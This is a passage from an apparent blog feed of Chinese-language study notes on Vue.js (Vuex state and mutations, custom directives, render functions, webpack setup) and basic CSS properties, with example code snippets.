vuex<br></code></pre></td></tr></table></figure><p>​    2.Vuex得使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//main.js</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;Vuex&#x27;</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>);<br><br><span class="hljs-keyword">const</span> store=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>      <span class="hljs-attr">state</span>:&#123;<br>          <span class="hljs-comment">//定义一个数据</span><br>        <span class="hljs-attr">count</span>:<span class="hljs-number">0</span><br>      &#125;<br>&#125;);<br><br><span class="hljs-comment">//在任何vue文件中都可以获取该数据</span><br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        //获取数据<br>          &#123;&#123; $store.state.count &#125;&#125;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>    name:&#x27;Counter&#x27;,<br>    //使用computed方法显示<br>    computed:&#123;<br>        count()&#123;<br>            return this.$store.state.count;<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>3.修改vuex的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs vue">const store=new Vuex.Store(&#123;<br>      state:&#123;<br>        count:0<br>      &#125;,<br>//首先在store中声明两个mutations<br>      mutations:&#123;<br>//increase可以再添加一个参数来控制数值改变的大小；<br>        increase(state)&#123;<br>          state.count+=1;<br>        &#125;,<br>        decrease(state)&#123;<br>          state.count-=1;<br>        &#125;<br>      &#125;<br>&#125;);<br><br><br>&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;button @click=&quot;handleIncrease&quot;&gt;+1&lt;/button&gt;<br>          &#123;&#123; count &#125;&#125;<br>        &lt;button @click=&quot;handleDecrease&quot;&gt;-1&lt;/button&gt;  <br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import Button from &#x27;./Button.vue&#x27;;<br>export default &#123;<br>  components: &#123; Button &#125;,<br>    name:&#x27;Counter&#x27;,<br>    computed:&#123;<br>        count()&#123;<br>            return this.$store.state.count;<br>        &#125;<br>    &#125;,<br>    //使用methods方法来调用mutations实现数据修改；<br>    methods:&#123;<br>        handleIncrease:function()&#123;<br>            this.$store.commit(&#x27;increase&#x27;);<br>        &#125;,<br>        handleDecrease:function()&#123;<br>            this.$store.commit(&#x27;decrease&#x27;);<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>ES6小语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//函数的参数可以设定默认值，当没有传入参数使用默认参数;一个参数不够时，可以传入一个对象，无限扩展；</span><br>increase（state，n)&#123;<br>    n=n || <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>4.高级用法</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS笔记</title>
    <link href="/2020/12/03/CSS%E7%89%B9%E6%80%A7/"/>
    <url>/2020/12/03/CSS%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<p>1.向 div 元素添加阴影</p><p>box-shadow: 20px 10px 5px pink;</p><p>参数：长 宽 颜色</p><p>2.display</p><table><thead><tr><th>none</th><th>此元素不会被显示。</th></tr></thead><tbody><tr><td>block</td><td>此元素将显示为块级元素，此元素前后会带有换行符。</td></tr><tr><td>inline</td><td>默认。此元素会被显示为内联元素，元素前后没有换行符。</td></tr><tr><td>inline-block</td><td>行内块元素。（CSS2.1 新增的值）</td></tr></tbody></table><p>3.border-redius</p><p>给div元素添加圆角的边框</p><p>4.outline</p><p>设置元素周围的轮廓</p><table><thead><tr><th align="left">值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>outline-color</em></td><td align="left">规定边框的颜色。参阅：<a href="https://www.runoob.com/cssref/pr-outline-color.html">outline-color</a> 中可能的值。</td></tr><tr><td align="left"><em>outline-style</em></td><td align="left">规定边框的样式。参阅：<a href="https://www.runoob.com/cssref/pr-outline-style.html">outline-style</a> 中可能的值。</td></tr><tr><td align="left"><em>outline-width</em></td><td align="left">规定边框的宽度。参阅：<a href="https://www.runoob.com/cssref/pr-outline-width.html">outline-width</a> 中可能的值。</td></tr><tr><td align="left">inherit</td><td align="left">规定应该从父元素继承 outline 属性的设置。</td></tr></tbody></table><p>5.a:active 激活后样式<br>{<br>background-color:yellow;<br>}</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（7）</title>
    <link href="/2020/12/03/Vue.js%E5%AE%9E%E6%88%98%EF%BC%887%EF%BC%89/"/>
    <url>/2020/12/03/Vue.js%E5%AE%9E%E6%88%98%EF%BC%887%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch10-使用webpack"><a href="#Ch10-使用webpack" class="headerlink" title="Ch10 使用webpack"></a>Ch10 使用webpack</h1><h3 id="一、webpack基础"><a href="#一、webpack基础" class="headerlink" title="一、webpack基础"></a>一、webpack基础</h3><p>​    1.import和export</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> config=&#123;<br>    <span class="hljs-attr">version</span>:<span class="hljs-string">&#x27;1.1.0&#x27;</span><br>&#125;;<br><span class="hljs-keyword">export</span> &#123; <span class="hljs-title class_">Config</span> &#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">var</span> config=&#123;<br>    <span class="hljs-attr">versiom</span>:<span class="hljs-string">&#x27;1.1.0&#x27;</span><br>&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>)&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;;<br><br><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Config</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./config/js&#x27;</span><br><span class="hljs-keyword">import</span> &#123; add &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./add.js&#x27;</span><br><br><span class="hljs-comment">//默认输出</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>&#123;<br>    <br>&#125;;<br></code></pre></td></tr></table></figure><p>​    2.npm导入库</p><p>​    import Vue from ‘vue’;</p><p>​    import $ from ‘jquery’;</p><p>​    3.webpack基本配置</p><p>​        npm init  //初始化</p><p>​        npm install webpack –sav-dev //作为开发依赖来安装webpack</p><p>​        npm install webpack-dev-server –save-dev //安装开发环境服务器</p><p>​        npm dev //启动本服务器</p><p>​        webpack –progress –hide-modules //修建模组？</p><p>​        npm install css-loader –save-dev</p><p>​        npm install style-loader –save-dev</p><p>​        npm install extract-text-webpack-plugin –save-dev</p><p>​        npm run build //打包</p><p>4.箭头函数</p><p>render：h=&gt;h(App)等同于：</p><p>render:function(h){</p><p>return h(App)</p><p>}也等同于：</p><p>render:h=&gt;{</p><p>return h(App);</p><p>****}</p><p>注：箭头函数里得this指向与普通函数不同，箭头函数得this是定义时得对象，而不是使用时得对象；</p><p>5.ES 6语法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">components</span>: &#123;<br>   <span class="hljs-title class_">Title</span>,<br>   <span class="hljs-title class_">Button</span>,<br> &#125;,<br> <br> <span class="hljs-attr">components</span>:&#123;<br>     <span class="hljs-attr">vTitle</span>:<span class="hljs-title class_">Title</span>,<br>     <span class="hljs-attr">vButton</span>:<span class="hljs-title class_">Button</span><br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（6）</title>
    <link href="/2020/12/01/Vue.js%E5%AE%9E%E6%88%98%EF%BC%886%EF%BC%89/"/>
    <url>/2020/12/01/Vue.js%E5%AE%9E%E6%88%98%EF%BC%886%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch8-自定义命令"><a href="#Ch8-自定义命令" class="headerlink" title="Ch8 自定义命令"></a>Ch8 自定义命令</h1><h3 id="一、基本用法"><a href="#一、基本用法" class="headerlink" title="一、基本用法"></a>一、基本用法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//全局注册</span><br><br>    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">directive</span>(<span class="hljs-string">&#x27;focus&#x27;</span>,&#123;<br>            <span class="hljs-comment">//指令选项</span><br>        &#125;)<br><span class="hljs-comment">//局部注册，作用域在app内</span><br>        <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>            <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,<br>            <span class="hljs-attr">directives</span>:&#123;<br>                <span class="hljs-attr">focus</span>:&#123;<br>                    <span class="hljs-comment">//指令选项</span><br>                &#125;<br>            &#125;<br>        &#125;)<br></code></pre></td></tr></table></figure><ol><li>bind：第一次绑定到元素时使用；</li><li>inserted：被绑定元素插入父节点时使用；</li><li>update：绑定元素模板更新时使用，不论绑定值是否发生变化；</li><li>componentUpdated：被绑定元素完成一次更新周期时使用；</li><li>unbind： 指令与元素解绑时调用；</li></ol><h3 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h3><p>代码已经存在电脑</p><h1 id="Ch9-Render函数"><a href="#Ch9-Render函数" class="headerlink" title="Ch9 Render函数"></a>Ch9 Render函数</h1><h3 id="一、Virtual-Dom：一个JavaScript对象，在状态发生变化时，Virtual-Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；"><a href="#一、Virtual-Dom：一个JavaScript对象，在状态发生变化时，Virtual-Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；" class="headerlink" title="一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；"></a>一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> vNode=&#123;<br>    <span class="hljs-attr">tag</span>:<span class="hljs-string">&#x27;div&#x27;</span>,<br>    <span class="hljs-attr">attributes</span>:&#123;<br>        <span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;main&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">children</span>:[<br>        <span class="hljs-comment">//p节点</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>1.vNode分类：</p><table><thead><tr><th>Node</th><th>Function</th></tr></thead><tbody><tr><td>ElementVnode</td><td>普通元素节点</td></tr><tr><td>TextVNode</td><td>文本节点</td></tr><tr><td>ComponentVNode</td><td>组件节点</td></tr><tr><td>EmptyVNode</td><td>无内容的注释节点</td></tr><tr><td>CloneVNode</td><td>克隆节点</td></tr></tbody></table><h3 id="二、createElement用法"><a href="#二、createElement用法" class="headerlink" title="二、createElement用法"></a>二、createElement用法</h3><p>1.传统方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ele</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ele</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;ele&#x27;</span>, &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27; &lt;div id=&quot;element&quot; :class=&quot;&#123;show:show&#125;&quot; @click=&quot;handleClick&quot;&gt;元素内容&lt;/div&gt;&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">handleClick</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;clock&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2.使用Render改写后</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ele</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ele</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;ele&#x27;</span>, &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">render</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">createElement</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-title function_">createElement</span>(</span><br><span class="language-javascript">                <span class="hljs-string">&#x27;div&#x27;</span>,</span><br><span class="language-javascript">                &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">class</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-string">&#x27;show&#x27;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">attrs</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;element&#x27;</span></span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">on</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">click</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span></span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-string">&#x27;文本内容1&#x27;</span></span><br><span class="language-javascript">            )</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span> &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">handleClick</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;click&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>3，就此例而言，render得写法复杂于template写法，所以在合适的场景使用render</p><p>4.约束：所有的组件树中，如果VNODE是组件或者含有slot，那么Vnode必须唯一</p><p>5.render函数里创建了一个cloneVNode得工厂函数，通过递归将slot所有子节点克隆一份，并对VNode的关键属性也复制了一份；</p><h3 id="三、函数化组件"><a href="#三、函数化组件" class="headerlink" title="三、函数化组件"></a>三、函数化组件</h3><p>​    1.vue提供了一个functional的布尔值选项，设置为true可以使组件无状态和无实例，也就没有data和this上下文；render返回虚拟节点也更加容易渲染；</p><p>​    2.函数化组件得是适用场景：</p><ul><li>程序化得在多个组件中选择一个</li><li>在将children，props，data传递给子组件之前操作他们；</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue笔记</title>
    <link href="/2020/11/29/Vue%E5%AE%9E%E6%88%98%E9%97%AE%E9%A2%98/"/>
    <url>/2020/11/29/Vue%E5%AE%9E%E6%88%98%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>Vue实战问题</p><ul><li><p><input disabled="" type="checkbox">  1.VScode中部分组件调用显示蓝色，部分显示红色？</p></li><li><p><input checked="" disabled="" type="checkbox">  2.标签组件出现Bug,无法显示标题，有待解决；</p></li></ul><p>CSS特性</p><ol><li>cursor规定要显示的光标的类型，此处pointer为一只手</li><li>CSS 框模型概述</li></ol><p><img src="https://www.w3school.com.cn/i/ct_boxmodel.gif" alt="CSS 框模型"></p><p>3.padding 属性定义元素的内边距。padding 属性接受长度值或百分比值，但不允许使用负值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">h1</span> &#123;padding: <span class="hljs-number">10</span>px <span class="hljs-number">0</span>.<span class="hljs-number">25</span>em <span class="hljs-number">2</span>ex <span class="hljs-number">20</span>%;&#125;<br></code></pre></td></tr></table></figure><p><strong>注意：</strong>上下内边距与左右内边距一致；即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。</p><p>4.border 元素的边框就是围绕元素内容和内边据的一条或多条线。</p><p>5.margin 属性接受任何长度单位，可以是像素、英寸、毫米或 em。</p><p>margin 可以设置为 auto。更常见的做法是为外边距设置长度值。</p><p>6.外边距合并</p><p>外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。</p><p>简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。</p><p>当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。</p><p><strong>注释：</strong>只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（5）</title>
    <link href="/2020/11/27/Vue.js%E5%AE%9E%E6%88%98%EF%BC%885%EF%BC%89/"/>
    <url>/2020/11/27/Vue.js%E5%AE%9E%E6%88%98%EF%BC%885%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch7-组件详解"><a href="#Ch7-组件详解" class="headerlink" title="Ch7 组件详解"></a>Ch7 组件详解</h1><h3 id="1-组件的创建使用"><a href="#1-组件的创建使用" class="headerlink" title="1.组件的创建使用"></a>1.组件的创建使用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">my-component1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;my-component1&#x27;</span>,&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;div&gt;&lt;p&gt;This is my component1&lt;/p&gt;&lt;/div&gt;&#x27;</span></span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注意： a.组件需要注册之后才可以使用；    b.组件template中必须被一个元素包含，如&lt;div&gt;&lt;/div&gt;</p><p>​           c.组件可以使用data,methods,computed; data必须是函数，然后return；</p><h3 id="2-组件数据的使用"><a href="#2-组件数据的使用" class="headerlink" 